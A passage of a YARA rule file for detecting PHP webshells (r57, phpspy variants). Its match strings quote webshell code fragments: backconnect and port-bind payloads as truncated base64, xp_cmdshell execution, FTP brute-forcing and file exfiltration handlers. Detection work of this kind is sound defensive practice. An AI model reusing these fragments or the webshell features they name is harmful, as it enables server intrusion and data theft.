      $s5 = "if (($_SERVER[\"PHP_AUTH_USER\"] != $auth[\"login\"]) or (md5($_SERVER[\"PHP_AUTH_PW\"]) != $auth[\"md5pass\"])) {" fullword ascii
      $s6 = "return \"http://milw0rm.com/search.php?dong=\".$OSV.\" \".$Lversion;" fullword ascii
      $s7 = "array(\"Processes\",$surl.\"act=processes&d=%d\")," fullword ascii
      $s8 = "$safemodeexecdir = @ini_get(\"safe_mode_exec_dir\");" fullword ascii
      $s9 = "$sort_default = \"0a\"; #Pengurutan, 0 - nomor kolom. \"a\"scending atau \"d\"escending" fullword ascii
      $s10 = "nMessage:\\n\".htmlspecialchars($fdbk_body).\"\\n\\nIP: \".$REMOTE_ADDR;" fullword ascii
      $s11 = "$quicklaunch2[] = array(\"<br>FTP-Brute\",$surl.\"act=ftpquickbrute&d=%d\");" fullword ascii
      $s12 = "\".: Feedback or report bug (\".str_replace(array(\"@\",\".\"),array(\"[at]\",\"[dot]\"),$suppmail).\") :.</td></tr>\"." fullword ascii
      $s13 = "$phpinfo = base64_encode(ob_get_contents());" fullword ascii
      $s14 = "t type=\\\"hidden\\\" name=\\\"fdbk_ref\\\" value=\\\"\".urlencode($HTTP_REFERER).\"\\\"><br>\"." fullword ascii
      $s15 = "\"<tr><td>Message:</td><td><textarea name=\\\"fdbk_body\\\" cols=80 rows=10>\".htmlspecialchars($fdbk_body).\"</textarea><inpu" fullword ascii
      $s16 = "if (!empty($auth[\"login\"])) {" fullword ascii
      $s17 = "header(\"WWW-Authenticate: Basic realm=\\\"\".$sh_name.\": Restricted Area\\\"\");" fullword ascii
      $s18 = "echo \"<center><b>Thanks for your feedback! Your ticket ID: \".$ticket.\".</b></center>\";" fullword ascii
      $s19 = "## QUICK COMMANDS ##" fullword ascii
      $s20 = ".shell {background-color:#000000;color:#00FF00;padding:5px;font-size:12;}" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _phpspy_2005_full_phpspy_2005_lite_27
{
   meta:
      description = "php22 - from files phpspy_2005_full.php, phpspy_2005_lite.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c2b377ee1e465ed9acba15789b866d1a9a39b8880380367376332135e806a067"
      hash2 = "5e358c2385ce5ffcab0797dd1767ca9d55747bf834191d0afe12f17eb7e1428d"
   strings:
      $s1 = "$shellmode=(!get_cfg_var(\"safe_mode\")) ? \" | <a href=\\\"?action=shell\\\">WebShell</a>\" : \"\";" fullword ascii
      $s2 = "echo $msg=@copy($_FILES['uploadmyfile']['tmp_name'],\"\".$uploaddir.\"/\".$_FILES['uploadmyfile']['name'].\"\") ? \"" fullword ascii
      $s3 = "<input type=\"submit\" name=\"login\" value=\"OK\">" fullword ascii
      $s4 = "echo \"  <td align=\\\"center\\\" nowrap valign=\\\"top\\\"><a href=\\\"?downfile=\".urlencode($filepath).\"\\\">" fullword ascii
      $s5 = "$dbpassword = isset($dbpassword) ? $dbpassword : '';" fullword ascii
      $s6 = "$dbusername = isset($dbusername) ? $dbusername : 'root';" fullword ascii
      $s7 = "<td colspan=\"3\" align=\"center\" nowrap><a href=\"?action=logout\">" fullword ascii
      $s8 = "<table width=\"760\" border=\"0\" align=\"center\" cellpadding=\"3\" cellspacing=\"1\" bgcolor=\"#ffffff\">" fullword ascii
      $s9 = "<input type=\"submit\" value=\"execute\" class=\"input\"></td>" fullword ascii
      $s10 = "if ($login) {" fullword ascii
      $s11 = "$adminpass=trim($_POST['adminpass']);" fullword ascii
      $s12 = "<form action=\"?action=phpenv\" method=\"POST\">" fullword ascii
      $s13 = "$servername = isset($servername) ? $servername : 'localhost';" fullword ascii
      $s14 = "<td align=\"center\"><textarea name=\"sql_query\" cols=\"85\" rows=\"10\"></textarea></td>" fullword ascii
      $s15 = "<table width=\"760\" border=\"0\" cellpadding=\"3\" cellspacing=\"0\" bgcolor=\"#ffffff\">" fullword ascii
      $s16 = "elseif ($_GET['action'] == \"deldir\") {" fullword ascii
      $s17 = "$onoff = get_cfg_var('register_globals');" fullword ascii
      $s18 = "</a> | <a href=\\\"?dir=\".urlencode($dir).\"&delfile=\".urlencode($filepath).\"\\\">" fullword ascii
      $s19 = "setcookie (\"adminpass\",$admin['pass'],time()+(1*24*3600));" fullword ascii
      $s20 = "<form action=\"?action=sql\" method=\"POST\">" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 100KB and ( 8 of them )
      ) or ( all of them )
}

rule _R0XEM_ShElL_r57__15__r57_bd_r57_r577_r57shell_r57shell1_40_r57shell127_r57shell2_0_r57Shell_0de93ccddbeddbea5954e4dacb37a6a_29
{
   meta:
      description = "php22 - from files R0XEM_ShElL.php, r57 (15).php, r57-bd.php, r57.php, r577.php, r57shell.php, r57shell1.40.php, r57shell127.php, r57shell2.0.php, r57Shell_0de93ccddbeddbea5954e4dacb37a6a9d343c1b3.php, r57Shell_0fa5df7bbf035cb307867a5b5e783abfb0158976.php, r57Shell_a5f8c9622eaae6ad40454b3605c37b10483c836b.php, r57shell_v.1.42_edited_by_kibngdefacer.php, r57_1php.php, r57_4.php, r57_iFX.php, r57_kartal.php, r57_Mohajer22.php, r57_Shell.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f74780a5550f4cdfd0298caf88c460076a9861638bad518a27773f61da27d53d"
      hash2 = "ffca7aeeab1e56ff8010a15f1511e8bcea90cfdcc84248e18d53dacde04cf08b"
      hash3 = "4adf0f6edf2981d489a3401b0327bba8e0f1f039bc8b23f884054bc6740376a9"
      hash4 = "1b92b1abcca09ac8d7d4d3b3c05e4decec11a31e4b71157305979e67df63bc7f"
      hash5 = "93b5f77fcdd31be1a1384c2a942514e83bc5788b523e544b093ae0e56fe9561a"
      hash6 = "05f30186c9edbbf906f8971df2470fa1411f8c029ec7109f20f16ed197191644"
      hash7 = "b5ae25fc5a43fc95297ee6477b18e3c44dbdafca5ba424c24a9680a8560a8ba1"
      hash8 = "9a4f47269ef5fc12c128532307d33ff528b0445929acbeff19148e8cf69456b8"
      hash9 = "20ccd077d37e8789dd9ed08fb9d126547c2b16715d9891d90ebf8f9372c323e7"
      hash10 = "c567ec472c68a604d58bd14864487871556bcff7c26b9640b3bf032955e7dddc"
      hash11 = "b54be385d814a2deefc5f788255c6f58fffc7855d8d530b937679eec2eabcf14"
      hash12 = "6b2de11c6a60289616c2fc9ea44cc0c70dc0f19dac7cd85767e05aef42833d2d"
      hash13 = "3e1130a845de93c4e43de5470e9c28eb09a31edf2c6fdb9f0f05e303eae8d228"
      hash14 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
      hash15 = "63449c64a6d8b823c39a6b18998534f14492793a324f10d65179431d1c94a30f"
      hash16 = "c4dadade5cd680bd6ac7ba5854d65b751feccc5c3a2300c69c3a7965b6c1d5ef"
      hash17 = "8113587c0c5860fb6c1fe2cc2fd610cde85b28ffa1d5fdee1ef26b956c382894"
      hash18 = "a5127bc0ac6c8ec4c570ca8763be7f6cc051338f418ccef777542e05824cb16a"
      hash19 = "d0819e45f7c6acf3bd0b8dcf49ee4f3ba4edd152038a84043752eea3f04afa39"
   strings:
      $s1 = "$_POST['cmd'] = 'find '.$_POST['s_dir'].' -name \\''.$_POST['s_mask'].'\\' | xargs grep -E \\''.$_POST['s_text'].'\\'';" fullword ascii
      $s2 = "if (!empty($_POST['port'])&&!empty($_POST['bind_pass'])&&($_POST['use']==\"C\"))" fullword ascii
      $s3 = "if ($_POST['cmd']==\"mysql_dump\")" fullword ascii
      $s4 = "if (!empty($_POST['port'])&&!empty($_POST['bind_pass'])&&($_POST['use']==\"Perl\"))" fullword ascii
      $s5 = "$_POST['cmd']=\"echo \\\"Now script try connect to \".$_POST['ip'].\" port \".$_POST['port'].\" ...\\\"\";" fullword ascii
      $s6 = "$datapipe_pl=\"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgSU86OlNvY2tldDsNCnVzZSBQT1NJWDsNCiRsb2NhbHBvcnQgPSAkQVJHVlswXTsNCiRob3N0I" fullword ascii
      $s7 = "$datapipe_c=\"I2luY2x1ZGUgPHN5cy90eXBlcy5oPg0KI2luY2x1ZGUgPHN5cy9zb2NrZXQuaD4NCiNpbmNsdWRlIDxzeXMvd2FpdC5oPg0KI2luY2" fullword ascii
      $s8 = "$port_bind_bd_c=\"I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8c3lzL3R5cGVzLmg+DQojaW5jbHVkZS" fullword ascii
      $s9 = "'----------------------------------------------------------------------------------------------------'=>'ls -la'" fullword ascii
      $s10 = "$_POST['cmd']=\"ps -aux | grep bdpl\";" fullword ascii
      $s11 = "$_POST['cmd']=\"ps -aux | grep dp\";" fullword ascii
      $s12 = "$_POST['cmd']=\"ps -aux | grep bd\";" fullword ascii
      $s13 = "$_POST['cmd']=\"ps -aux | grep dpc\";" fullword ascii
      $s14 = "$port_bind_bd_pl=\"IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vYmFzaCAtaSI7DQppZiAoQEFSR1YgPCAxKSB7IGV4aXQoMSk7IH0NCiRMS" fullword ascii
      $s15 = "$back_connect=\"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj" fullword ascii
      $s16 = "$back_connect_c=\"I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC" fullword ascii
      $s17 = "foreach (@ini_get_all() as $key=>$value)" fullword ascii
      $s18 = "$_POST['cmd']=\"edit_file\";" fullword ascii
      $s19 = "echo((!empty($uname))?(ws(3).@substr($uname,0,120).\"<br>\"):(ws(3).@substr(@php_uname(),0,120).\"<br>\"));" fullword ascii
      $s20 = "$CurString = @preg_replace($pattern,\"<SPAN style='color: #990000;'><b>\\\\1</b></SPAN>\",$CurString);" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x3c0a ) and filesize < 900KB and ( 8 of them )
      ) or ( all of them )
}

rule _phpspy_2009MSSQL_phpspy2009withMSSQL_picconf_30
{
   meta:
      description = "php22 - from files phpspy-2009MSSQL.php, phpspy2009withMSSQL.php, picconf.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5cfb62e3f564c3ddbfc77d978ae422d455a1862683e72754492683ad4e1c0ee2"
      hash2 = "c5692bd52a09abd2d2fd3c4de5ac4ddda3923ae855899f0ddf912d9862843f89"
      hash3 = "828e13e143dc50bcde769128772066e303c7fdb10da81f9b6090978e9b4fbb82"
   strings:
      $x1 = "<a href=\"javascript:goaction('shell');\">Execute Command</a> | " fullword ascii
      $s2 = "header('Content-Disposition: attachment;filename='.$_SERVER['HTTP_HOST'].'_Files.tar.gz');" fullword ascii
      $s3 = "<?php if (!IS_WIN) {?> | <a href=\"javascript:goaction('backconnect');\">Back Connect</a><?php }?>" fullword ascii
      $s4 = "p('<h2>File Manager - Current disk free '.sizecount($free).' of '.sizecount($all).' ('.$used_percent.'%)</h2>');" fullword ascii
      $s5 = "p('<td><a href=\"'.$fileurl.'\" target=\"_blank\">'.$filedb['filename'].'</a></td>');" fullword ascii
      $s6 = ".head td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#e9e9e9;padding:5px 10px 5px 5px;font-weight:bold;}" fullword ascii
      $s7 = "<a href=\"javascript:goaction('sqlfile');\">MySQL Upload &amp; Download</a> | " fullword ascii
      $s8 = "$filename = basename($_SERVER['HTTP_HOST'].'_MySQL.sql');" fullword ascii
      $s9 = "setcookie($key, $value, $timestamp+$life, $admin['cookiepath'], $admin['cookiedomain'], $useport);" fullword ascii
      $s10 = "p('<a href=\"javascript:opfile(\\'newtime\\',\\''.$filedb['server_link'].'\\',\\''.$filedb['dirlink'].'\\');\">Time</a>');" fullword ascii
      $s11 = "<td><a href=\"javascript:dofile(\\'downrar\\');\">Packing download selected</a> - <a href=\"javascript:dofile(\\'delfiles\\');\"" ascii
      $s12 = "<input type=\"hidden\" name=\"doing\" value=\"login\">" fullword ascii
      $s13 = "<td><span style=\"float:right;\"><a href=\"http://www.4ngel.net\" target=\"_blank\"><?php echo str_replace('.','','P.h.p.S.p.y')" ascii
      $s14 = "echo '<div style=\"background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:center;font-weight:bold;\">';" fullword ascii
      $s15 = "<a href=\"javascript:goaction('logout');\">Logout</a> | " fullword ascii
      $s16 = "<td><span style=\"float:right;\">Safe Mode:<?php echo getcfg('safe_mode');?></span>" fullword ascii
      $s17 = "p('<meta http-equiv=\"refresh\" content=\"1;URL='.$self.'\">');" fullword ascii
      $s18 = "11 => array('PHPINFO',(IS_PHPINFO ? '<a href=\"javascript:goaction(\\'phpinfo\\');\">Yes</a>' : 'No'))," fullword ascii
      $s19 = "e->FreeSpace).'&#13;Type:'.$DriveTypeDB[$drive->DriveType].'\">'.$DriveTypeDB[$drive->DriveType].'('.$drive->Path.')</a>');" fullword ascii
      $s20 = "$mysqldata .= sqldumptable($currow[0]);" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _r57__15__r57_bd_r57_r577_r57shell_r57Shell_0de93ccddbeddbea5954e4dacb37a6a9d343c1b3_r57Shell_0fa5df7bbf035cb307867a5b5e783a_31
{
   meta:
      description = "php22 - from files r57 (15).php, r57-bd.php, r57.php, r577.php, r57shell.php, r57Shell_0de93ccddbeddbea5954e4dacb37a6a9d343c1b3.php, r57Shell_0fa5df7bbf035cb307867a5b5e783abfb0158976.php, r57shell_v.1.42_edited_by_kibngdefacer.php, r57_1php.php, r57_4.php, r57_iFX.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ffca7aeeab1e56ff8010a15f1511e8bcea90cfdcc84248e18d53dacde04cf08b"
      hash2 = "4adf0f6edf2981d489a3401b0327bba8e0f1f039bc8b23f884054bc6740376a9"
      hash3 = "1b92b1abcca09ac8d7d4d3b3c05e4decec11a31e4b71157305979e67df63bc7f"
      hash4 = "93b5f77fcdd31be1a1384c2a942514e83bc5788b523e544b093ae0e56fe9561a"
      hash5 = "05f30186c9edbbf906f8971df2470fa1411f8c029ec7109f20f16ed197191644"
      hash6 = "c567ec472c68a604d58bd14864487871556bcff7c26b9640b3bf032955e7dddc"
      hash7 = "b54be385d814a2deefc5f788255c6f58fffc7855d8d530b937679eec2eabcf14"
      hash8 = "3e1130a845de93c4e43de5470e9c28eb09a31edf2c6fdb9f0f05e303eae8d228"
      hash9 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
      hash10 = "63449c64a6d8b823c39a6b18998534f14492793a324f10d65179431d1c94a30f"
      hash11 = "c4dadade5cd680bd6ac7ba5854d65b751feccc5c3a2300c69c3a7965b6c1d5ef"
   strings:
      $s1 = "?? ?????? ??? GID (??????) \\r\\n- ??? ??????? CHMOD - ????? ????? ? ???????????? ????????????? (???????? 0777)\"," fullword ascii
      $s2 = "'ru_text9' =>'???????? ????? ? ???????? ??? ? /bin/bash'," fullword ascii
      $s3 = "'ru_text85'=>'???????? ??????????? ?????? ??????????? safe_mode ????? ?????????? ?????? ? MSSQL ???????'," fullword ascii
      $s4 = "'ru_text75'=>'* ????? ???????????? ?????????? ?????????'," fullword ascii
      $s5 = "'ru_text35'=>'???????? ??????????? ?????? ??????????? safe_mode ????? ???????? ????? ? mysql'," fullword ascii
      $s6 = "'ru_text34'=>'???????? ??????????? ?????? ??????????? safe_mode ????? ??????? include'," fullword ascii
      $s7 = "'ru_text44'=>'?????????????? ????? ??????????! ?????? ?????? ??? ??????!'," fullword ascii
      $s8 = "'ru_text47'=>'???????? ???????? php.ini'," fullword ascii
      $s9 = "'ru_text71'=>\"?????? ???????? ???????:\\r\\n- ??? CHOWN - ??? ?????? ???????????? ??? ??? UID (??????) \\r\\n- ??? ??????? CHGR" ascii
      $s10 = "'ru_text71'=>\"?????? ???????? ???????:\\r\\n- ??? CHOWN - ??? ?????? ???????????? ??? ??? UID (??????) \\r\\n- ??? ??????? CHGR" ascii
      $s11 = "'ru_text76'=>'????? ?????? ? ?????? ? ??????? ??????? find'," fullword ascii
      $s12 = "'ru_text15'=>'???????? ?????? ? ?????????? ???????'," fullword ascii
      $s13 = "'ru_text48'=>'???????? ????????? ??????'," fullword ascii
      $s14 = "'ru_text40'=>'???? ??????? ???? ??????'," fullword ascii
      $s15 = "'ru_text57'=>'???????/??????? ????/??????????'," fullword ascii
      $s16 = "'ru_text5' =>'???????? ?????? ?? ??????'," fullword ascii
      $s17 = "'ru_text2' =>'?????????? ?????? ?? ???????'," fullword ascii
      $s18 = "'ru_text49'=>'???????? ??????? ? ???????'," fullword ascii
      $s19 = "'ru_text32'=>'?????????? PHP ????'," fullword ascii
      $s20 = "'ru_text62'=>'?????????? ???????'," fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 600KB and ( 8 of them )
      ) or ( all of them )
}

rule _R0XEM_ShElL_r57__15__r57_bd_r57_r577_r57shell_r57shell1_40_r57shell127_r57shell2_0_r57Shell_0de93ccddbeddbea5954e4dacb37a6a_32
{
   meta:
      description = "php22 - from files R0XEM_ShElL.php, r57 (15).php, r57-bd.php, r57.php, r577.php, r57shell.php, r57shell1.40.php, r57shell127.php, r57shell2.0.php, r57Shell_0de93ccddbeddbea5954e4dacb37a6a9d343c1b3.php, r57Shell_0fa5df7bbf035cb307867a5b5e783abfb0158976.php, r57Shell_a5f8c9622eaae6ad40454b3605c37b10483c836b.php, r57shell_v.1.42_edited_by_kibngdefacer.php, r57_1php.php, r57_4.php, r57_iFX.php, r57_kartal.php, r57_Mohajer22.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f74780a5550f4cdfd0298caf88c460076a9861638bad518a27773f61da27d53d"
      hash2 = "ffca7aeeab1e56ff8010a15f1511e8bcea90cfdcc84248e18d53dacde04cf08b"
      hash3 = "4adf0f6edf2981d489a3401b0327bba8e0f1f039bc8b23f884054bc6740376a9"
      hash4 = "1b92b1abcca09ac8d7d4d3b3c05e4decec11a31e4b71157305979e67df63bc7f"
      hash5 = "93b5f77fcdd31be1a1384c2a942514e83bc5788b523e544b093ae0e56fe9561a"
      hash6 = "05f30186c9edbbf906f8971df2470fa1411f8c029ec7109f20f16ed197191644"
      hash7 = "b5ae25fc5a43fc95297ee6477b18e3c44dbdafca5ba424c24a9680a8560a8ba1"
      hash8 = "9a4f47269ef5fc12c128532307d33ff528b0445929acbeff19148e8cf69456b8"
      hash9 = "20ccd077d37e8789dd9ed08fb9d126547c2b16715d9891d90ebf8f9372c323e7"
      hash10 = "c567ec472c68a604d58bd14864487871556bcff7c26b9640b3bf032955e7dddc"
      hash11 = "b54be385d814a2deefc5f788255c6f58fffc7855d8d530b937679eec2eabcf14"
      hash12 = "6b2de11c6a60289616c2fc9ea44cc0c70dc0f19dac7cd85767e05aef42833d2d"
      hash13 = "3e1130a845de93c4e43de5470e9c28eb09a31edf2c6fdb9f0f05e303eae8d228"
      hash14 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
      hash15 = "63449c64a6d8b823c39a6b18998534f14492793a324f10d65179431d1c94a30f"
      hash16 = "c4dadade5cd680bd6ac7ba5854d65b751feccc5c3a2300c69c3a7965b6c1d5ef"
      hash17 = "8113587c0c5860fb6c1fe2cc2fd610cde85b28ffa1d5fdee1ef26b956c382894"
      hash18 = "a5127bc0ac6c8ec4c570ca8763be7f6cc051338f418ccef777542e05824cb16a"
   strings:
      $x1 = "@mssql_query(\"insert into r57_temp_table EXEC master.dbo.xp_cmdshell '\".$_POST['test4_file'].\"'\",$db);" fullword ascii
      $s2 = ".txt;.php;.htm )\".in('hidden','cmd',0,'search_text').in('hidden','dir',0,$dir));" fullword ascii
      $s3 = "$db = @mssql_connect('localhost,'.$_POST['test4_port'],$_POST['test4_ml'],$_POST['test4_mp']);" fullword ascii
      $s4 = "$db = @mysql_connect('localhost:'.$_POST['test3_port'],$_POST['test3_ml'],$_POST['test3_mp']);" fullword ascii
      $s5 = "$res = mssql_query(\"select * from r57_temp_table\",$db);" fullword ascii
      $s6 = "ption><option value=\\\"C\\\">datapipe.c</option></select>\".in('hidden','dir',0,$dir));" fullword ascii
      $s7 = "echo sr(15,\"<b>\".$lang[$language.'_text55'].$arrow.\"</b>\",in('checkbox','m id=m',0,'1').in('text','s_mask',82,'.txt;.php')." ascii
      $s8 = "@mssql_query(\"create table r57_temp_table ( string VARCHAR (500) NULL)\",$db);" fullword ascii
      $s9 = "($_POST['test4_mp']):(\"password\"))).ws(4).\"<b>\".$lang[$language.'_text14'].$arrow.\"</b>\".in('text','test4_port',15,(!empty" ascii
      $s10 = "echo sr(15,\"<b>\".$lang[$language.'_text36'].$arrow.\"</b>\",in('text','test4_md',15,(!empty($_POST['test4_md'])?($_POST['test4" ascii
      $s11 = "echo sr(15,\"<b>\".$lang[$language.'_text3'].$arrow.\"</b>\",in('text','cmd',85,''));" fullword ascii
      $s12 = "T['test4_port'])?($_POST['test4_port']):(\"1433\"))));" fullword ascii
      $s13 = "if ($_POST['cmd']==\"php_eval\"){" fullword ascii
      $s14 = "echo sr(40,\"<b>\".$lang[$language.'_text14'].$arrow.\"</b>\",in('text','port',15,'11457'));" fullword ascii
      $s15 = "echo in('hidden','db_port',0,$_POST['db_port']);" fullword ascii
      $s16 = "echo sr(15,\"<b>\".$lang[$language.'_text30'].$arrow.\"</b>\",in('text','test1_file',85,(!empty($_POST['test1_file'])?($_POST['t" ascii
      $s17 = "echo sr(15,\"<b>\".$lang[$language.'_text30'].$arrow.\"</b>\",in('text','test2_file',85,(!empty($_POST['test2_file'])?($_POST['t" ascii
      $s18 = "echo in('hidden','dir',0,$dir).in('hidden','cmd',0,'php_eval');" fullword ascii
      $s19 = "idden','cmd',0,'find_text').in('hidden','dir',0,$dir));" fullword ascii
      $s20 = "echo sr(15,\"<b>\".$lang[$language.'_text55'].$arrow.\"</b>\",in('checkbox','m id=m',0,'1').in('text','s_mask',82,'.txt;.php')." ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x3c0a ) and filesize < 900KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _r57__15__r57_r57shell_r57shell127_r57shell2_0_r57Shell_0de93ccddbeddbea5954e4dacb37a6a9d343c1b3_r57Shell_0fa5df7bbf035cb307_33
{
   meta:
      description = "php22 - from files r57 (15).php, r57.php, r57shell.php, r57shell127.php, r57shell2.0.php, r57Shell_0de93ccddbeddbea5954e4dacb37a6a9d343c1b3.php, r57Shell_0fa5df7bbf035cb307867a5b5e783abfb0158976.php, r57_1php.php, r57_4.php, r57_Mohajer22.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ffca7aeeab1e56ff8010a15f1511e8bcea90cfdcc84248e18d53dacde04cf08b"
      hash2 = "1b92b1abcca09ac8d7d4d3b3c05e4decec11a31e4b71157305979e67df63bc7f"
      hash3 = "05f30186c9edbbf906f8971df2470fa1411f8c029ec7109f20f16ed197191644"
      hash4 = "9a4f47269ef5fc12c128532307d33ff528b0445929acbeff19148e8cf69456b8"
      hash5 = "20ccd077d37e8789dd9ed08fb9d126547c2b16715d9891d90ebf8f9372c323e7"
      hash6 = "c567ec472c68a604d58bd14864487871556bcff7c26b9640b3bf032955e7dddc"
      hash7 = "b54be385d814a2deefc5f788255c6f58fffc7855d8d530b937679eec2eabcf14"
      hash8 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
      hash9 = "63449c64a6d8b823c39a6b18998534f14492793a324f10d65179431d1c94a30f"
      hash10 = "a5127bc0ac6c8ec4c570ca8763be7f6cc051338f418ccef777542e05824cb16a"
   strings:
      $x1 = "else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user))) { echo \"[+] $user:\".strrev($user).\" - suc" ascii
      $x2 = "if(!@ftp_login($connection,$_POST['ftp_login'],$_POST['ftp_password'])) { fe($language,1); }" fullword ascii
      $s3 = "if(isset($_POST['cmd']) && !empty($_POST['cmd']) && $_POST['cmd']==\"download_file\" && !empty($_POST['d_name']))" fullword ascii
      $s4 = "$filedump = @fread($file,@filesize($_POST['loc_file']));" fullword ascii
      $s5 = "$filedump = @fread($file,@filesize($_POST['d_name']));" fullword ascii
      $s6 = "if(isset($_POST['cmd']) && !empty($_POST['cmd']) && $_POST['cmd']==\"mail_file\" && !empty($_POST['loc_file']))" fullword ascii
      $s7 = "if(!empty($_POST['cmd']) && ($_POST['cmd']==\"ftp_file_up\" || $_POST['cmd']==\"ftp_file_down\"))" fullword ascii
      $s8 = "if(!$file=@fopen($_POST['loc_file'],\"r\")) { echo re($_POST['loc_file']); $_POST['cmd']=\"\"; }" fullword ascii
      $s9 = "if(!$file=@fopen($_POST['d_name'],\"r\")) { echo re($_POST['d_name']); $_POST['cmd']=\"\"; }" fullword ascii
      $s10 = "if(!$connection) { fe($language,0); $_POST['cmd'] = \"\"; }" fullword ascii
      $s11 = "if(isset($_POST['cmd']) && !empty($_POST['cmd']) && $_POST['cmd']==\"mail\")" fullword ascii
      $s12 = "OST['ftp_server_port']):(\"127.0.0.1:21\"))).in('hidden','cmd',0,'ftp_brute').ws(4).in('submit','submit',0,$lang[$language.'_but" ascii
      $s13 = "echo sr(15,\"<b>\".$lang[$language.'_text88'].$arrow.\"</b>\",in('text','ftp_server_port',85,(!empty($_POST['ftp_server_port'])?" ascii
      $s14 = "if(!empty($_POST['cmd']) && $_POST['cmd']==\"ftp_brute\")" fullword ascii
      $s15 = "echo sr(25,\"<b>\".$lang[$language.'_text37'].$arrow.\"</b>\",in('text','ftp_login',45,(!empty($_POST['ftp_login'])?($_POST['ftp" ascii
      $s16 = "echo sr(15,\"<b>\".$lang[$language.'_text91'].$arrow.\"</b>\",in('radio','compress',0,'none').' '.$arh);" fullword ascii
      $s17 = "$res = mail($_POST['to'],$_POST['subj'],$_POST['text'],\"From: \".$POST['from'].\"\\r\\n\");" fullword ascii
      $s18 = "echo sr(25,\"<b>\".$lang[$language.'_text37'].$arrow.\"</b>\",in('text','ftp_login',45,(!empty($_POST['ftp_login'])?($_POST['ftp" ascii
      $s19 = "echo sr(25,\"<b>\".$lang[$language.'_text91'].$arrow.\"</b>\",in('radio','compress',0,'none').' '.$arh);" fullword ascii
      $s20 = "function get_users()" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x3c0a ) and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _persian_polish_pt_pt_portuguese_34
{
   meta:
      description = "php22 - from files persian.php, polish.php, pt-pt.portuguese.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "de7bacd36213eb7508a36f3e29bbf7cae3594602c1199500d1c8d8003f19af57"
      hash2 = "9d96bf11b1b3c743d8624abe906875820c617e0614656af0a5f382c27499b319"
      hash3 = "635ceb56f5660c12e1d2876b21f52dc127435acb3349d606298f51b81af9cd4e"
   strings:
      $s1 = "$lang['alert_delete_multiple'] = 'Are you sure that you want to delete those {items_amount} items?';" fullword ascii
      $s2 = "$lang['alert_delete_multiple_one'] = 'Are you sure that you want to delete this 1 item?';" fullword ascii
      $s3 = "/* Added in version 1.4 */" fullword ascii
      $s4 = "/* Added in version 1.2.1 */" fullword ascii
      $s5 = "/* Added in version 1.5.6 */" fullword ascii
      $s6 = "/* Added in version 1.3.1 */" fullword ascii
      $s7 = "/* Added in version 1.5.2 */" fullword ascii
      $s8 = "/* Added in version 1.5.1 */" fullword ascii
      $s9 = "/* Added in version 1.2.2 */" fullword ascii
      $s10 = "/* Added in version 1.6.1 */" fullword ascii
      $s11 = "/* Added in version 1.5.8 */" fullword ascii
      $s12 = "/* Javascript messages */" fullword ascii
      $s13 = "/* Upload functionality */" fullword ascii
      $s14 = "$lang['error_on_uploading'] " fullword ascii
      $s15 = "$lang['error_max_number_of_files'] " fullword ascii
      $s16 = "$lang['error_accept_file_types'] " fullword ascii
      $s17 = "$lang['error_min_file_size'] " fullword ascii
      $s18 = "$lang['error_max_file_size'] " fullword ascii
      $s19 = "$lang['delete_error_message'] " fullword ascii
      $s20 = "$lang['ui_year'] = 'yyyy';" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 10KB and ( 8 of them )
      ) or ( all of them )
}

rule _phpspy_2009MSSQL_phpspy2009withMSSQL_phpspy2011_35
{
   meta:
      description = "php22 - from files phpspy-2009MSSQL.php, phpspy2009withMSSQL.php, phpspy2011.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5cfb62e3f564c3ddbfc77d978ae422d455a1862683e72754492683ad4e1c0ee2"
      hash2 = "c5692bd52a09abd2d2fd3c4de5ac4ddda3923ae855899f0ddf912d9862843f89"
      hash3 = "a2f9b4e1dcf40053915fc68b554cfeae59ebfc71464f1c4cbab05e9456b0762a"
   strings:
      $x1 = "p('<p><a href=\"http://w'.'ww.4ng'.'el.net/php'.'spy/pl'.'ugin/\" target=\"_blank\">Get plugins</a></p>');" fullword ascii
      $s2 = "scookie('loginpass', '', -86400 * 365);" fullword ascii
      $s3 = "$attachsize = '<a href=\"javascript:getsize(\\''.$dirdb['server_link'].'\\',\\''.$dir.'\\');\">Stat</a>';" fullword ascii
